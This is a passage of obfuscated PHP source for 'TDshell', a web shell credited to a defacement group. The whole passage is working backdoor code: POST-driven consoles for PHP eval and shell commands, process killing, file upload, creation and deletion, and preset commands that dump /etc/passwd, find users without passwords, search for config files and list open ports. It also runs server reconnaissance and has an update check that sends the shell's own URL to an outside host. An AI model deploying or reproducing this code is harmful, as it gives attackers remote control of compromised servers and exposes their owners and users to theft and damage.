							elseif ($_2e5c25529adea7d7ad4802936aee0b48 == "delete")
								{
									$_2a46f3328eaed89ef8402d4effba331e = $_POST['confirm_delete'];
									if (!isset($_POST['confirm_delete']))
										{
											$_2211b5dc6bb7947adcb0bf14cee6591e = $_d3befca3813d65aff84c2353e705a0dd;
											$this->out("Are you sure you wish to delete directory <b>" . processdir($_2211b5dc6bb7947adcb0bf14cee6591e) . "</b><br>" . '<form action="' . $this->make_link("dir", array("act" => "delete", "name" => $_d3befca3813d65aff84c2353e705a0dd), NULL, TRUE) . '" method="post"><input name="confirm_delete" type="hidden" id="confirm_delete" value="YES"><input type="submit" value="Delete"></form>');
										}
									else
										{
											$_2211b5dc6bb7947adcb0bf14cee6591e = $_d3befca3813d65aff84c2353e705a0dd;
											if (!delete_directory($_d3befca3813d65aff84c2353e705a0dd))
												{
													$this->out("Are you sure you wish to delete directory <b>" . processdir($_2211b5dc6bb7947adcb0bf14cee6591e) . "</b><br><b>Failed!</b><br>" . '<form action="' . $this->make_link("dir", array("act" => "delete", "name" => $_d3befca3813d65aff84c2353e705a0dd), NULL, TRUE) . '" method="post"><input name="confirm_delete" type="hidden" id="confirm_delete" value="YES"><input type="submit" value="Delete"></form>');
												}
											else
												{
													$_2211b5dc6bb7947adcb0bf14cee6591e = @pathinfo($_2211b5dc6bb7947adcb0bf14cee6591e);
													$_2211b5dc6bb7947adcb0bf14cee6591e = $_2211b5dc6bb7947adcb0bf14cee6591e['dirname'];
													$this->out("<b>Directory Deleted.</b><br>" . $this->make_link("list", array("name" => $_2211b5dc6bb7947adcb0bf14cee6591e), "Click here to go back."));
												};
										}
								}
							else
								{
									$this->process("dir", array("name" => $_d3befca3813d65aff84c2353e705a0dd, "act" => "info"));
									return FALSE;
								};
						break;
						case "sql":
							$this->out("<center><b>(My)SQL Support will be added in future versions of TDshell.</b></center>");
						break;
						case "eval":
							$_202860a67864e2245a32e15193fe3cf4 = $_POST['evaldata'];
							$_4e708563acf942967766e0209568749c = $_POST['evalmethod'];
							if (empty($_202860a67864e2245a32e15193fe3cf4))
								{
									$this->out('<center><b>Evaluation Console</b></center><form method="post" action="' . $this->make_link("eval", NULL, NULL, TRUE) . '" enctype="multipart/form-data"><textarea name="evaldata" rows="15" id="evaldata" style="width:100%;"></textarea><input name="evalmethod" type="radio" value="textbox" checked>Display in TextBox<br><input name="evalmethod" type="radio" value="html">Display normally<br><input type="submit" value="Evaluate"></form>');
								}
							else
								{
									$_202860a67864e2245a32e15193fe3cf4 = @stripslashes($_202860a67864e2245a32e15193fe3cf4);
									if ($_4e708563acf942967766e0209568749c == "textbox")
										{
											@ob_start();
											eval($_202860a67864e2245a32e15193fe3cf4);
											$_abeb01d5ff8f108e1106e763a15f95ed .= @ob_get_clean();
											$_abeb01d5ff8f108e1106e763a15f95ed = @htmlspecialchars($_abeb01d5ff8f108e1106e763a15f95ed);
											$this->out('<center><b>Evaluation Console</b></center><form method="post" action="' . $this->make_link("eval", NULL, NULL, TRUE) . '" enctype="multipart/form-data"><textarea rows="15" id="evaldata" style="width:100%;">' . $_abeb01d5ff8f108e1106e763a15f95ed . '</textarea><textarea name="evaldata" rows="15" id="evaldata" style="width:100%;">' . @htmlspecialchars($_202860a67864e2245a32e15193fe3cf4) . '</textarea><input name="evalmethod" type="radio" value="textbox" checked>Display in TextBox<br><input name="evalmethod" type="radio" value="html">Display normally<br><input type="submit" value="Evaluate"></form>');
										}
									else
										{
											@ob_start();
											eval($_202860a67864e2245a32e15193fe3cf4);
											$_abeb01d5ff8f108e1106e763a15f95ed = @ob_get_clean();
											$this->out('<center><b>Evaluation Console</b></center><form method="post" action="' . $this->make_link("eval", NULL, NULL, TRUE) . '" enctype="multipart/form-data">' . $_abeb01d5ff8f108e1106e763a15f95ed . '<br><textarea name="evaldata" rows="15" id="evaldata" style="width:100%;">' . @htmlspecialchars($_202860a67864e2245a32e15193fe3cf4) . '</textarea><input name="evalmethod" type="radio" value="textbox">Display in TextBox<br><input name="evalmethod" type="radio" value="html" checked>Display normally<br><input type="submit" value="Evaluate"></form>');
										};
								};
						break;

						case "exec":
							$_2b2605084efea7c9994ec50aacf83c64 = $_POST['execdata'];
							$_4e708563acf942967766e0209568749c = $_POST['execmethod'];
							if (empty($_2b2605084efea7c9994ec50aacf83c64))
								{
									$_2b2605084efea7c9994ec50aacf83c64 = $_ec4ae32bf3e3a09bae7ff3e84ebbc667['otherexec'];
								};
							if (empty($_4e708563acf942967766e0209568749c))
								{
									$_4e708563acf942967766e0209568749c = $_ec4ae32bf3e3a09bae7ff3e84ebbc667['othermethod'];
								};
							if (empty($_2b2605084efea7c9994ec50aacf83c64))
								{
									$this->out('<center><b>Execution Console</b></center><form method="post" action="' . $this->make_link("exec", NULL, NULL, TRUE) . '" enctype="multipart/form-data"><textarea name="execdata" rows="15" id="execdata" style="width:100%;"></textarea><input name="execmethod" type="radio" value="textbox" checked>Display in TextBox<br><input name="execmethod" type="radio" value="html">Display normally<br><input type="submit" value="Execute"></form>');
								}
							else
								{
									$_2b2605084efea7c9994ec50aacf83c64 = @stripslashes($_2b2605084efea7c9994ec50aacf83c64);
									if ($_4e708563acf942967766e0209568749c == "textbox")
										{
											@ob_start();
											echo custom_exec($_2b2605084efea7c9994ec50aacf83c64);
											$_abeb01d5ff8f108e1106e763a15f95ed .= @ob_get_clean();
											$_abeb01d5ff8f108e1106e763a15f95ed = @htmlspecialchars($_abeb01d5ff8f108e1106e763a15f95ed);
											$this->out('<center><b>Execution Console</b></center><form method="post" action="' . $this->make_link("exec", NULL, NULL, TRUE) . '" enctype="multipart/form-data"><textarea rows="15" style="width:100%;">' . $_abeb01d5ff8f108e1106e763a15f95ed .'</textarea><textarea name="execdata" rows="15" id="execdata" style="width:100%;">' . htmlspecialchars($_2b2605084efea7c9994ec50aacf83c64) . '</textarea><input name="execmethod" type="radio" value="textbox" checked>Display in TextBox<br><input name="execmethod" type="radio" value="html">Display normally<br><input type="submit" value="Execute"></form>');
										}
									else
										{
											@ob_start();
											echo custom_exec($_2b2605084efea7c9994ec50aacf83c64);
											$_abeb01d5ff8f108e1106e763a15f95ed .= @ob_get_clean();
											$_abeb01d5ff8f108e1106e763a15f95ed = @htmlspecialchars($_abeb01d5ff8f108e1106e763a15f95ed);
											$this->out('<center><b>Execution Console</b></center><form method="post" action="' . $this->make_link("exec", NULL, NULL, TRUE) . '" enctype="multipart/form-data">' . $_abeb01d5ff8f108e1106e763a15f95ed . '<br><textarea name="execdata" rows="15" id="execdata" style="width:100%;">' . @htmlspecialchars($_2b2605084efea7c9994ec50aacf83c64) . '</textarea><input name="execmethod" type="radio" value="textbox" checked>Display in TextBox<br><input name="execmethod" type="radio" value="html">Display normally<br><input type="submit" value="Execute"></form>');
										};
								};
						break;

						case "proc":
							$_57eefc72bcbe3daf2bb185189468725a = $_ec4ae32bf3e3a09bae7ff3e84ebbc667['do'];
							if (empty($_57eefc72bcbe3daf2bb185189468725a))
								{
									$_4bc9908fada98cbfd1396fceed921faa = '/^([A-Za-z0-9]*)\\s{1,}([0-9]{1,10})\\s{1,}.*[0-9]{1,}:[0-9]{2,}\\s(.*)$/';
							
									if (!($_c9a15425a6e12ac0295a2b759e048768 = custom_exec("ps aux")))
										{
											$this->out("<center>TDshell Process Manager Failed: No valid permissions.</center>");
											return FALSE;
										};
									$_c9a15425a6e12ac0295a2b759e048768 = @explode("\n", $_c9a15425a6e12ac0295a2b759e048768);
									foreach ($_c9a15425a6e12ac0295a2b759e048768 as $_6557ccde5bb0523391c98ec92365d5a9)
										{
											if (@preg_match($_4bc9908fada98cbfd1396fceed921faa, $_6557ccde5bb0523391c98ec92365d5a9, $_38c09efe88a67e6a5344c0bbcc44c7d4))
												{
													unset($_38c09efe88a67e6a5344c0bbcc44c7d4[0]);
													$_38c09efe88a67e6a5344c0bbcc44c7d4['FULL'] = $_6557ccde5bb0523391c98ec92365d5a9;
													$_15241b5cdd6d57b1fac3c1eb60905cd8[] = $_38c09efe88a67e6a5344c0bbcc44c7d4;
												};
										};
									natsort2d($_15241b5cdd6d57b1fac3c1eb60905cd8);
									$_10626691c8b3c6af89adc170cee73ebb = "";
									$_ee1cbb2fd23ff45ac77733a06636a3c7 = "";
									foreach ($_15241b5cdd6d57b1fac3c1eb60905cd8 as $_a3ae37119660c8023a43787f58268912)
										{
											$_8501d6dd59b45b2159f1f73f6e17b11f = @md5(@microtime() . $_a3ae37119660c8023a43787f58268912);
											$_46fc346549f1eeca72e169bb77bf12d8 = "";
											if ($_a3ae37119660c8023a43787f58268912[2] == @getmypid())
												{
													$_46fc346549f1eeca72e169bb77bf12d8 = " style='background-color:#FFFFF0'";
												};
											if ($_a3ae37119660c8023a43787f58268912[1] == @get_current_user())
												{
													$_a3ae37119660c8023a43787f58268912[1] = "<font color=green>$_a3ae37119660c8023a43787f58268912[1]</font>";
													$_10626691c8b3c6af89adc170cee73ebb .= "<tr$_46fc346549f1eeca72e169bb77bf12d8 title='" . @htmlspecialchars($_a3ae37119660c8023a43787f58268912['FULL'], ENT_QUOTES) . "'><td width=25%>$_a3ae37119660c8023a43787f58268912[1]</td><td width=25%>$_a3ae37119660c8023a43787f58268912[2]</td><td width=25%>$_a3ae37119660c8023a43787f58268912[3]</td><td width=25%>" . $this->make_link("proc", array("do" => "kill", "pid" => $_a3ae37119660c8023a43787f58268912[2]), "KILL") . " - " . '<a id="button_kill_proc_' . $_8501d6dd59b45b2159f1f73f6e17b11f . '" href="javascript:;" onclick=\'itemShowHide("kill_proc_' . $_8501d6dd59b45b2159f1f73f6e17b11f . '","button_kill_proc_' . $_8501d6dd59b45b2159f1f73f6e17b11f . '");\'>[+]</a><div id="kill_proc_' . $_8501d6dd59b45b2159f1f73f6e17b11f . '" style=\'display: none;\'><b>' . $_a3ae37119660c8023a43787f58268912['FULL'] . '</b></div>' . "</td></tr>";
												}
											else
												{
													$_ee1cbb2fd23ff45ac77733a06636a3c7 .= "<tr$_46fc346549f1eeca72e169bb77bf12d8 title='" . @htmlspecialchars($_a3ae37119660c8023a43787f58268912['FULL'], ENT_QUOTES) . "'><td width=25%>$_a3ae37119660c8023a43787f58268912[1]</td><td width=25%>$_a3ae37119660c8023a43787f58268912[2]</td><td width=25%>$_a3ae37119660c8023a43787f58268912[3]</td><td width=25%>" . $this->make_link("proc", array("do" => "kill", "pid" => $_a3ae37119660c8023a43787f58268912[2]), "KILL") . " - " . '<a id="button_kill_proc_' . $_8501d6dd59b45b2159f1f73f6e17b11f . '" href="javascript:;" onclick=\'itemShowHide("kill_proc_' . $_8501d6dd59b45b2159f1f73f6e17b11f . '","button_kill_proc_' . $_8501d6dd59b45b2159f1f73f6e17b11f . '");\'>[+]</a><div id="kill_proc_' . $_8501d6dd59b45b2159f1f73f6e17b11f . '" style=\'display: none;\'><b>' . $_a3ae37119660c8023a43787f58268912['FULL'] . '</b></div>' . "</td></tr>";
												};
										};
									$this->out("<table width=\"100%\"><tr><th>User</th><th>PID</th><th>Command</th><th>Actions</th>" . $_10626691c8b3c6af89adc170cee73ebb . $_ee1cbb2fd23ff45ac77733a06636a3c7 . "</table>");
								}
							else
								{
									$_6cac525ed87733d2d6bf528558ef4c06 = $_ec4ae32bf3e3a09bae7ff3e84ebbc667['pid'];
									if (custom_exec("kill " . @intval($_6cac525ed87733d2d6bf528558ef4c06)) === FALSE)
										{
											$this->out("<center><b>Could not kill process ID " . @intval($_6cac525ed87733d2d6bf528558ef4c06) . "</b></center>");
										}
									$this->process("proc");
								};
						break;
						case "update":
							$_c14f19c15d50e72a5733c0ad88a035b9 = @fopen("http://tdshell.thedefaced.org/latest.php?chk=" . @base64_encode(current_URI()), "r");
							while ((!@feof($_c14f19c15d50e72a5733c0ad88a035b9)) && ($_c14f19c15d50e72a5733c0ad88a035b9))
								{
									$_45e1fe4475ff3a7426e094d9638a5f22 .= @fread($_c14f19c15d50e72a5733c0ad88a035b9, 1024);
								};
							if ($_45e1fe4475ff3a7426e094d9638a5f22 == @md5($this->TDshell_version))
								{
									$this->out("<b><font color='green'>Your version of TDshell is up to date.</font></b>");
								}
							elseif (empty($_45e1fe4475ff3a7426e094d9638a5f22))
								{
									$this->out("<b><font color='red'>Error: Failed to retrieve latest version.</font></b>");
								}
							else
								{
									$this->out("<b><font color='red'>Your version of TDshell is out of date. <a href='http://tdshell.thedefaced.org/'>Please replace your current shell with the latest version located here.</a></font></b>");
								};
						break;
						case "mkdir":
							$_0b63e7829d4893613b17575c517db17d = $_POST['mkdir'];
							if (empty($_0b63e7829d4893613b17575c517db17d))
								{
									$this->out("<center><b>Could not create directory, empty name provided.</b></center>");
									$this->process("list");
								}
							else
								{
									if (!@mkdir($_0b63e7829d4893613b17575c517db17d, 0777))
										{
											$this->out("<center><b>Could not create directory, permission denied.</b></center>");
											$this->process("list");
										}
									else
										{
											@clearstatcache();
											$this->process("list", array("dir" => $_0b63e7829d4893613b17575c517db17d));
										};
								};
						break;
						case "godir":
							$_942922064772e69fea37ad32e72dfd70 = $_POST['godir'];
							$this->process("list", array("dir" => $_942922064772e69fea37ad32e72dfd70));
						break;
						case "mkfile":
							$_0dc4ed3391208760f7f43fc80a2441e5 = $_POST['mkfile'];
							if (!@fopen($_0dc4ed3391208760f7f43fc80a2441e5, "w"))
								{
									$this->out("<center><b>Could not make file, permission denied.</b></center>");
									$this->process("list");
								}
							else
								{
									$this->process("file", array("act" => "edit", "name" => $_0dc4ed3391208760f7f43fc80a2441e5));
								};
						break;
						case "gofile":
							$_cacb8c32699f649131f8eaa04c25222c = $_POST['gofile'];
							$this->process("file", array("act" => "view", "name" => $_cacb8c32699f649131f8eaa04c25222c));
						break;
						case "upload":
							$_031d648129f7450af0529cbf0825fd58 = $_POST['destination'];
							$_8add29b89df2cfe7786dd8ba967ff1e2 = $_031d648129f7450af0529cbf0825fd58 . @basename($_FILES['file']['name']);
							if (@move_uploaded_file($_FILES['file']['tmp_name'], $_8add29b89df2cfe7786dd8ba967ff1e2))
								{
							    	$this->process("file", array("act" => "edit", "name" => $_8add29b89df2cfe7786dd8ba967ff1e2));
								}
							else
								{
								    $this->out("<center><b>Error uploading file!</b></center>");
								};
						break;
						case "ping":
							$this->out("be457c74983226e519e3564f8699eb4e");
						break;
						case "alias":
							$_93ddad4f44750399cbee70b6508b6ea3 = $_POST['alias'];
							$this->process("exec", array("otherexec" => $_93ddad4f44750399cbee70b6508b6ea3, "othermethod" => "textbox"));
						break;
						case "":
							$this->process("list", $_ec4ae32bf3e3a09bae7ff3e84ebbc667);
						break;
						case "credits":
							$this->out("<b>" . $this->TDshell_version . "</b> - Credits<br>");
							$this->out("www.TheDefaced.org<br>
Debug: For critical development and idea planning of the shell<br>
x2Fusion: For crutial ideas and planning of the development of the shell<br>
Kr3w: For inspirational ideas that contributed greatly to the project<br>
Tr3mbl3r: With massive ideas for development and features that he planned<br><br>TDshell homepage located <a href='http://tdshell.thedefaced.org/'>here</a>.");
						break;
						case @base64_decode("OTQ1VU84VUVSLTQzOFVFOVJJT0dILTVZUlRHVTlJT1JUTkhHRTVULTQzNVRVR0ZJNUgzNFRBVzk4NC00LTMtMzQ1VERGUw=="):
							$this->out(base64_decode("QSBCYW5zaGVlIFRoZSBXaWx0DQpDYW5jZWwgQW5kIFJlYWwNCkhhdCBUaGlucyBUd28NCkVhdGVuIE91dHMgWW93DQoNCkk0U0g4SUZI"));
						break;
												default:
							@ob_start();
							print_r($_ec4ae32bf3e3a09bae7ff3e84ebbc667);
							$_bb8084d9c33052d4e3d1354f2746b6bb = @ob_get_clean();
							$this->out("<b>Error: could not process your request; the act does not exist.</b><br><pre>Act: $_2e5c25529adea7d7ad4802936aee0b48\n$_bb8084d9c33052d4e3d1354f2746b6bb</pre><br>");
						break;
					};
			}
		
		function header()
			{
				$this->out_template("HTML_HEADER_MAIN");
				$this->out_template("HTML_HEADER_HEAD_PRE");
				$this->out_template("HTML_HEADER_HEAD_TITLE");
				$this->out_template("HTML_HEADER_HEAD_SCRIPT");
				$this->out_template("HTML_HEADER_HEAD_STYLE");
				$this->out_template("HTML_HEADER_HEAD_SUF");
				$this->out_template("HTML_HEADER_BODY_PRE");
			}
		
		function footer($_948b7576a20aa0bb3f1d2055da74156c)
			{
				$this->out_template("HTML_HEADER_BODY_SUF");
				$this->out(@str_replace("{TIME_TAKEN}", $_948b7576a20aa0bb3f1d2055da74156c, $this->get_template("HTML_FOOTER_MAIN")));
			}
		
		function out($_45e1fe4475ff3a7426e094d9638a5f22)
			{
				$this->TDshell_data .= $_45e1fe4475ff3a7426e094d9638a5f22;
			}
		
		function outall()
			{
				echo $this->sanitize_output($this->TDshell_data);
			}
		
		function set_template($_d3befca3813d65aff84c2353e705a0dd, $_d52f547da0e098832b6b81469d36c48b)
			{
				$this->TDshell_template[$_d3befca3813d65aff84c2353e705a0dd] = $_d52f547da0e098832b6b81469d36c48b;
			}
		
		function make_link($_2e5c25529adea7d7ad4802936aee0b48, $_ec4ae32bf3e3a09bae7ff3e84ebbc667 = array(), $_a70fd9147fda16858f57fe0479d66df0 = "", $_c8872ae6a7d8ea0f53e6e72ed2ceeac1 = FALSE)
			{
				if (!empty($_2e5c25529adea7d7ad4802936aee0b48))
					{
						$_7622cf6629732edc545313527c803112 = "act=$_2e5c25529adea7d7ad4802936aee0b48";
					}
				if (!empty($_ec4ae32bf3e3a09bae7ff3e84ebbc667))
					{
						if (!empty($_ec4ae32bf3e3a09bae7ff3e84ebbc667))
							{
								if (empty($_2e5c25529adea7d7ad4802936aee0b48))
									{
										$_7622cf6629732edc545313527c803112 .= "args=";
									}
								else
									{
										$_7622cf6629732edc545313527c803112 .= "&args=";
									};
								foreach ($_ec4ae32bf3e3a09bae7ff3e84ebbc667 as $_ddc2938d74cdbcf22f9ecfaf2f1fb5be => $_c7104b3e36401bf0c1d4a5788ac2ad69)
									{
										$_7622cf6629732edc545313527c803112 .= @base64_encode($_ddc2938d74cdbcf22f9ecfaf2f1fb5be . ":" . $_c7104b3e36401bf0c1d4a5788ac2ad69) . "-";
									};
								if (@substr($_7622cf6629732edc545313527c803112, -1) == "-")
									{
										$_7622cf6629732edc545313527c803112 = @substr($_7622cf6629732edc545313527c803112, 0, @strlen($_7622cf6629732edc545313527c803112) -1);
									};
							};
					};
				$_42a6152a4d7c7d957669c6d70dc5ba87 = 'http';
				if ($_SERVER["HTTPS"] == "on")
					{
						$_42a6152a4d7c7d957669c6d70dc5ba87 .= "s";
					};
				$_42a6152a4d7c7d957669c6d70dc5ba87 .= "://";
				if ($_SERVER["SERVER_PORT"] != "80")
					{
  						$_42a6152a4d7c7d957669c6d70dc5ba87 .= $_SERVER["SERVER_NAME"].":".$_SERVER["SERVER_PORT"].$_SERVER["SCRIPT_NAME"];
					}
				else
					{
  						$_42a6152a4d7c7d957669c6d70dc5ba87 .= $_SERVER["SERVER_NAME"].$_SERVER["SCRIPT_NAME"];
 					};
 				if (!$_c8872ae6a7d8ea0f53e6e72ed2ceeac1)
 					{
		 				if (empty($_7622cf6629732edc545313527c803112))
		 					{
								$_42a6152a4d7c7d957669c6d70dc5ba87 = $_42a6152a4d7c7d957669c6d70dc5ba87 . "?" . "proc=out";
							}
						else
							{
								$_42a6152a4d7c7d957669c6d70dc5ba87 = $_42a6152a4d7c7d957669c6d70dc5ba87 . "?" . $_7622cf6629732edc545313527c803112 . "&proc=out";
							};
					}
				else
					{
						if (empty($_7622cf6629732edc545313527c803112))
			 					{
									$_42a6152a4d7c7d957669c6d70dc5ba87 = $_42a6152a4d7c7d957669c6d70dc5ba87 . "?";
								}
							else
								{
									$_42a6152a4d7c7d957669c6d70dc5ba87 = $_42a6152a4d7c7d957669c6d70dc5ba87 . "?" . $_7622cf6629732edc545313527c803112;
								};
					};
				$_3d1e4e37e3bb032a675f9b0de015bfca = $this->get_template("HTML_REL_LINK_BEG_PRE");
				$_3581e843f20285ea83417f61211d475a = $this->get_template("HTML_REL_LINK_BEG_SUF");
				$_7ebad0a61068a13c2d289a738022186a = $this->get_template("HTML_REL_LINK_END");
				if (!$_c8872ae6a7d8ea0f53e6e72ed2ceeac1)
					{
						return $_3d1e4e37e3bb032a675f9b0de015bfca . $_42a6152a4d7c7d957669c6d70dc5ba87 . $_3581e843f20285ea83417f61211d475a . $_a70fd9147fda16858f57fe0479d66df0 . $_7ebad0a61068a13c2d289a738022186a;
					}
				else
					{
						return $_42a6152a4d7c7d957669c6d70dc5ba87;
					};
			}
		
		function out_template($_d3befca3813d65aff84c2353e705a0dd)
			{
				$this->out($this->TDshell_template[$_d3befca3813d65aff84c2353e705a0dd]);
			}
		
		function get_template($_d3befca3813d65aff84c2353e705a0dd)
			{
				return $this->TDshell_template[$_d3befca3813d65aff84c2353e705a0dd];
			}
		
		function sanitize_output($_5d28db41dd3b63b0ad9702e535eedd73)
			{
			    $_c15977bdc89c079bde3a6687c20c1719 = array(
			        '/\>[^\S ]+/s',
			        '/[^\S ]+\</s'
			        );
			    $_0cb75167c55d51f5653f1217678b8a57 = array(
			        '>',
			        '<'
			        );
			  $_5d28db41dd3b63b0ad9702e535eedd73 = @preg_replace($_c15977bdc89c079bde3a6687c20c1719, $_0cb75167c55d51f5653f1217678b8a57, $_5d28db41dd3b63b0ad9702e535eedd73);
			    return $_5d28db41dd3b63b0ad9702e535eedd73;
			}
		function content_bottom_ext()
			{
				return '<table width="100%" border="0" cellspacing="0" cellpadding="0">
<tr>
	<th>
		Quick Execute
	</th>
	<th>
		Quick Eval
	</th>
</tr>
  <tr>
    <td width="50%"><form method="post" action="' . $this->make_link("exec", NULL, NULL, TRUE) . '"><input type="text" name="execdata" style="width:95%"><input type="hidden" name="execmethod" value="textbox"><br><input type="submit" name="Submit" value="Go"></form></td>
    <td width="50%"><form method="post" action="' . $this->make_link("eval", NULL, NULL, TRUE) . '"><input type="text" name="evaldata" style="width:95%"><input name="evalmethod" type="hidden" id="evalmethod" value="textbox"><br><input type="submit" name="Submit" value="Go">
    </form></td>
  </tr>
 <tr>
	<th>
		Make Directory
	</th>
	<th>
		Go to Directory </th>
</tr>
  <tr>
    <td width="50%"><form method="post" action="' . $this->make_link("mkdir", NULL, NULL, TRUE) . '"><input name="mkdir" type="text" id="mkdir" style="width:95%" value="' . @realpath(".") . DIRECTORY_SEPARATOR . '"><br>
        <input type="submit" name="Submit" value="Go"></form></td>
    <td width="50%"><form method="post" action="' . $this->make_link("godir", NULL, NULL, TRUE) . '"><input name="godir" type="text" id="godir" style="width:95%" value="' . @realpath(".") . DIRECTORY_SEPARATOR . '"><br>
        <input type="submit" name="Submit" value="Go">
    </form></td>
  </tr>
 <tr>
	<th>
		Make File
	</th>
	<th>
		Go to File
	</th>
</tr>
  <tr>
    <td width="50%"><form method="post" action="' . $this->make_link("mkfile", NULL, NULL, TRUE) . '"><input name="mkfile" type="text" id="mkfile" style="width:95%" value="' . @realpath(".") . DIRECTORY_SEPARATOR . '"><br>
        <input type="submit" name="Submit" value="Go"></form></td>
    <td width="50%"><form method="post" action="' . $this->make_link("gofile", NULL, NULL, TRUE) . '"><input name="gofile" type="text" id="gofile" style="width:95%" value="' . @realpath(".") . DIRECTORY_SEPARATOR . '"><br>
        <input type="submit" name="Submit" value="Go">
    </form></td>
  </tr>
   <tr>
	<th>
		Upload File
	</th>
	<th>
		Alias Commands
	</th>
</tr>
  <tr>
    <td width="50%"><form method="post" action="' . $this->make_link("upload", NULL, NULL, TRUE) . '" enctype="multipart/form-data"><input type="file" name="file"><input name="destination" type="text" id="destination" style="width:95%" value="' . @realpath(".") . DIRECTORY_SEPARATOR . '"><br>
        <input type="submit" name="Submit" value="Go"></form></td>
	    <td width="50%"><form method="post" action="' . $this->make_link("alias", NULL, NULL, TRUE) . '">
	<select name="alias">
		<option value="ls -la">List current directory</option>
		<option value="find . -name \'*config*\'">Find config files</option>
		<option value="cat /etc/passwd">View etc/passwd</option>
		<option value="cut -d: -f1,2,3 /etc/passwd | grep ::">View users without password</option>
		<option value="cat /proc/version /proc/cpuinfo">CPU Information</option>
		<option value="netstat -atup | grep IST">Open Ports</option>
	</select>
	<input type="submit" name="Submit" value="Go">
</form></td>
  </tr>
</table>';
			}
		function content_top_ext()
			{
				$_a9e5405d6581811dbff46e9ca3280bc1 .= "<center><b>Server Information</b>:</center>";
				$_074b7814a5770494227ce06e81ff999a = @getenv("SERVER_SOFTWARE");
				$_a9e5405d6581811dbff46e9ca3280bc1 .= "<b>Software</b>: " . @htmlspecialchars($_074b7814a5770494227ce06e81ff999a) . "<br>";
				if (($_600528b2c16959ec0b7415143daf3c2c = custom_exec("uptime")))
					{
						$_a9e5405d6581811dbff46e9ca3280bc1 .= "<b>Uptime</b>: $_600528b2c16959ec0b7415143daf3c2c<br>";
					};
				
				$_4894710f990f9bda9ef69a94d3de9a25 = @wordwrap(@php_uname(),100,"<br>",1);
				$_a9e5405d6581811dbff46e9ca3280bc1 .= "<b>System Info</b>: " . $_4894710f990f9bda9ef69a94d3de9a25 . "<br>";
				$_a9e5405d6581811dbff46e9ca3280bc1 .= "<b>Disabled Functions</b>: ";
				if('' == ($_404553cd7b56719c358d1c6d76f88164 = @ini_get('disable_functions')))
					{
						$_a9e5405d6581811dbff46e9ca3280bc1 .= "<font color=green>NONE</font><br>";
					}
				else
					{
						$_404553cd7b56719c358d1c6d76f88164 = @explode(",", $_404553cd7b56719c358d1c6d76f88164);
						$_4b61f566d85332046e5ea8c39d5595a9 = "";
						foreach ($_404553cd7b56719c358d1c6d76f88164 as $_96a32437f909f9609d8bb97987165016)
							{
								$_96a32437f909f9609d8bb97987165016 = @trim($_96a32437f909f9609d8bb97987165016);
								$_4b61f566d85332046e5ea8c39d5595a9 .= "<a href='http://php.net/" . $_96a32437f909f9609d8bb97987165016 . "' target='_target'>" . $_96a32437f909f9609d8bb97987165016 . "</a>" . ",";
							};
						$_4b61f566d85332046e5ea8c39d5595a9 = @substr($_4b61f566d85332046e5ea8c39d5595a9, 0, @strlen($_4b61f566d85332046e5ea8c39d5595a9) - 1);
						$_a9e5405d6581811dbff46e9ca3280bc1 .= "$_4b61f566d85332046e5ea8c39d5595a9<br>";
					};
				if(@ini_get("register_globals"))
					{
						$_0b72c338824fc598846641f1733ded93 = "<font color=green>ON</font><br>";
					}
				else
					{
						$_0b72c338824fc598846641f1733ded93 = "<font color=red>OFF</font><br>";
					};
				$_4aa5a13a07418cb3b1f532b2f73d68ae = @function_exists('mysql_connect');
				$_d264811448b31fb4b2772b416c9b6342 = @function_exists('mssql_connect'); 
				$_4faecc09d416a70e7c85c211689f976c = @function_exists('pg_connect'); 
				$_8050813e45b77747b44bfa1e66edf6e1 = @function_exists('ocilogon'); 
				if (@ini_get("safe_mode") or strtolower(@ini_get("safe_mode")) == "on")
					{
						$_ff72ae8d0a7c203fdca8802a4a3d4743 = "<font color=red>ON (secure)</font>";
					}
				else
					{
						$_ff72ae8d0a7c203fdca8802a4a3d4743 = "<font color=green>OFF (not secure)</font>";
					};
				$_a9e5405d6581811dbff46e9ca3280bc1 .= "<b>MySQL</b>: ";
				if ($_4aa5a13a07418cb3b1f532b2f73d68ae)
					{
						$_a9e5405d6581811dbff46e9ca3280bc1 .= "<font color=green>ON</font>";
					}
				else
					{
						$_a9e5405d6581811dbff46e9ca3280bc1 .= "<font color=red>OFF</font>";
					};
				$_a9e5405d6581811dbff46e9ca3280bc1 .= "<br>";
								$_a9e5405d6581811dbff46e9ca3280bc1 .= "<b>MSSQL</b>: ";
				if ($_d264811448b31fb4b2772b416c9b6342)
					{
						$_a9e5405d6581811dbff46e9ca3280bc1 .= "<font color=green>ON</font>";
					}
				else
					{
						$_a9e5405d6581811dbff46e9ca3280bc1 .= "<font color=red>OFF</font>";
					};
				$_a9e5405d6581811dbff46e9ca3280bc1 .= "<br>";
								$_a9e5405d6581811dbff46e9ca3280bc1 .= "<b>PostgreSQL</b>: ";
				if ($_4faecc09d416a70e7c85c211689f976c)
					{
						$_a9e5405d6581811dbff46e9ca3280bc1 .= "<font color=green>ON</font>";
					}
				else
					{
						$_a9e5405d6581811dbff46e9ca3280bc1 .= "<font color=red>OFF</font>";
					};
				$_a9e5405d6581811dbff46e9ca3280bc1 .= "<br>";
								$_a9e5405d6581811dbff46e9ca3280bc1 .= "<b>Oracle</b>: ";
				if ($_8050813e45b77747b44bfa1e66edf6e1)
					{
						$_a9e5405d6581811dbff46e9ca3280bc1 .= "<font color=green>ON</font>";
					}
				else
					{
						$_a9e5405d6581811dbff46e9ca3280bc1 .= "<font color=red>OFF</font>";
					};
				$_a9e5405d6581811dbff46e9ca3280bc1 .= "<br>";
								$_a9e5405d6581811dbff46e9ca3280bc1 .= "<b>Safemode</b>: ";
				$_a9e5405d6581811dbff46e9ca3280bc1 .= $_ff72ae8d0a7c203fdca8802a4a3d4743 . "<br>";
				$_d94dc5b08d928c237d98b0ed89179043 = @disk_free_space("./");
				$_7467c53f177b1d289f3e1b2e395b9056 = @disk_total_space("./");
				if ($_d94dc5b08d928c237d98b0ed89179043 === FALSE) {$_d94dc5b08d928c237d98b0ed89179043 = 0;}
				if ($_7467c53f177b1d289f3e1b2e395b9056 === FALSE) {$_7467c53f177b1d289f3e1b2e395b9056 = 0;}
				if ($_d94dc5b08d928c237d98b0ed89179043 < 0) {$_d94dc5b08d928c237d98b0ed89179043 = 0;}
				if ($_7467c53f177b1d289f3e1b2e395b9056 < 0) {$_7467c53f177b1d289f3e1b2e395b9056 = 0;}
				$_c3574082b118679ba0bc952292c18820 = @round(100/($_7467c53f177b1d289f3e1b2e395b9056/$_d94dc5b08d928c237d98b0ed89179043),2);
